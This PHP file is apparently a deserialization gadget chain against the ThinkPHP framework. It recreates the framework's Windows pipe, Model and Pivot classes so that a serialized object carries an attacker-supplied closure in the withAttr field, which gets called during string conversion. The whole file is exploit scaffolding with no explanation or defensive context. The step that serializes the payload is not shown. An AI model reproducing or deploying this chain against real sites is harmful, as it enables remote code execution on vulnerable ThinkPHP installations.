<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2018/8/24
 * Time: 13:38
 */


namespace think\process\pipes {
    class Windows{
        private $files = [];
        function __construct($files)
        {
            $this->files = $files;
        }
    }
}

namespace think\model\concern {
    trait Conversion{
        protected $visible;
    }

    trait RelationShip{
        private $relation;
    }

    trait Attribute{
        private $withAttr;
        private $data;
    }
}

namespace think {
    abstract class Model{
        use model\concern\RelationShip;
        use model\concern\Conversion;
        use model\concern\Attribute;

        function __construct($closure)
        {
            $this->data = array("wh1t3p1g"=>[]);
            $this->relation = array("wh1t3p1g"=>[]);
            $this->visible= array("wh1t3p1g"=>[]);
            $this->withAttr = array("wh1t3p1g"=>$closure);
        }
    }
}

namespace think\model {
    class Pivot extends \think\Model{
        function __construct($closure)
        {
            parent::__construct($closure);
        }
    }
}